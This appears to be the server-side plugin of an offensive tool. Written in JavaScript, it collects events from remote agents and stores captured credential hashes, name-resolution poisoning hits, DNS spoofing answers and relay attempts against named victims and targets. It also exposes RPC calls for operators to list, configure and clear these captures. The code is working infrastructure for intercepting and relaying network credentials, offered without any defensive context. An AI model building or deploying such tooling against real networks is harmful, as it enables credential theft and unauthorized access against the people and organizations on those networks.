function norm(payload) {
  if (payload == null) return {};
  if (typeof payload === "string") {
    try { return JSON.parse(payload); } catch { return { raw: payload }; }
  }
  if (payload instanceof Uint8Array || payload instanceof ArrayBuffer) {
    const s = new TextDecoder().decode(payload);
    try { return JSON.parse(s); } catch { return { raw: s }; }
  }
  return payload;
}

export default {
  setup(ctx) {
    ctx.clients = new Map();

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS hashes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT,
        user TEXT,
        domain TEXT,
        hash TEXT,
        proto TEXT,
        captured_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS hashes_client ON hashes(client_id)`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS poison (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        proto TEXT,
        name TEXT,
        from_host TEXT,
        seen_at INTEGER NOT NULL
      )`);
    ctx.db.run(`CREATE INDEX IF NOT EXISTS poison_client ON poison(client_id)`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS dnsspoof (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        domain TEXT,
        answer TEXT,
        from_host TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`
      CREATE TABLE IF NOT EXISTS relay (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        victim TEXT,
        target TEXT,
        success INTEGER,
        status TEXT,
        seen_at INTEGER NOT NULL
      )`);

    ctx.db.run(`CREATE TABLE IF NOT EXISTS config (client_id TEXT PRIMARY KEY, config TEXT NOT NULL)`);
  },

  onEvent(ctx, clientId, event, payload) {
    if (!clientId) return;
    ctx.clients.set(clientId, Date.now());
    const p = norm(payload);
    const now = Date.now();

    if (event === "status") {
      ctx.broadcast("status", { clientId, ...p });
    } else if (event === "hosts") {
      ctx.broadcast("hosts", { clientId, hosts: Array.isArray(p) ? p : [] });
    } else if (event === "ifaces") {
      ctx.broadcast("ifaces", { clientId, ifaces: Array.isArray(p) ? p : [] });
    } else if (event === "hash") {
      ctx.db.run(
        `INSERT INTO hashes (client_id, host, user, domain, hash, proto, captured_at)
         VALUES (?, ?, ?, ?, ?, ?, ?)`,
        clientId, p.host || null, p.user || null, p.domain || null, p.hash || null, p.proto || null, now
      );
      ctx.broadcast("hash", { clientId, ...p });
    } else if (event === "poison") {
      ctx.db.run(
        `INSERT INTO poison (client_id, proto, name, from_host, seen_at) VALUES (?, ?, ?, ?, ?)`,
        clientId, p.proto || null, p.name || null, p.from || null, now
      );
      ctx.broadcast("poison", { clientId, ...p });
    } else if (event === "dnsspoof") {
      ctx.db.run(
        `INSERT INTO dnsspoof (client_id, domain, answer, from_host, seen_at) VALUES (?, ?, ?, ?, ?)`,
        clientId, p.domain || null, p.answer || null, p.from || null, now
      );
      ctx.broadcast("dnsspoof", { clientId, ...p });
    } else if (event === "relay") {
      ctx.db.run(
        `INSERT INTO relay (client_id, victim, target, success, status, seen_at) VALUES (?, ?, ?, ?, ?, ?)`,
        clientId, p.victim || null, p.target || null, p.success ? 1 : 0, p.status || null, now
      );
      ctx.broadcast("relay", { clientId, ...p });
    } else if (event === "host") {
      ctx.broadcast("host", { clientId, ...p });
    } else if (event === "error") {
      ctx.broadcast("error", { clientId, ...p });
    } else if (event === "pong") {
      ctx.broadcast("pong", { clientId, ...p });
    }
  },

  rpc: {
    list_clients(ctx) {
      return Array.from(ctx.clients.entries()).map(([clientId, lastSeen]) => ({ clientId, lastSeen }));
    },

    get_config(ctx, params = {}) {
      const row = ctx.db.query(`SELECT config FROM config WHERE client_id = ?`).get(params.clientId || "");
      return row ? JSON.parse(row.config) : {};
    },

    save_config(ctx, params = {}) {
      ctx.db.run(
        `INSERT INTO config (client_id, config) VALUES (?, ?)
         ON CONFLICT(client_id) DO UPDATE SET config = excluded.config`,
        params.clientId, JSON.stringify(params.config || {})
      );
      return { ok: true };
    },

    list_hashes(ctx, params = {}) {
      const cid = params.clientId;
      return cid
        ? ctx.db.query(`SELECT id, host, user, domain, hash, proto, captured_at AS at
                        FROM hashes WHERE client_id = ? ORDER BY id DESC LIMIT 500`).all(cid)
        : ctx.db.query(`SELECT id, client_id AS clientId, host, user, domain, hash, proto, captured_at AS at
                        FROM hashes ORDER BY id DESC LIMIT 500`).all();
    },

    list_poison(ctx, params = {}) {
      return ctx.db.query(`SELECT proto, name, from_host AS host, seen_at AS at
                           FROM poison WHERE client_id = ? ORDER BY id DESC LIMIT 300`).all(params.clientId || "");
    },

    list_dnsspoof(ctx, params = {}) {
      return ctx.db.query(`SELECT domain, answer, from_host AS host, seen_at AS at
                           FROM dnsspoof WHERE client_id = ? ORDER BY id DESC LIMIT 300`).all(params.clientId || "");
    },

    list_relay(ctx, params = {}) {
      return ctx.db.query(`SELECT victim, target, success, status, seen_at AS at
                           FROM relay WHERE client_id = ? ORDER BY id DESC LIMIT 200`).all(params.clientId || "");
    },

    clear_captures(ctx, params = {}) {
      const cid = params.clientId;
      for (const t of ["hashes", "poison", "dnsspoof", "relay"]) {
        if (cid) {
          ctx.db.run(`DELETE FROM ${t} WHERE client_id = ?`, cid);
        } else {
          ctx.db.run(`DELETE FROM ${t}`);
        }
      }
      return { ok: true };
    },
  },
};
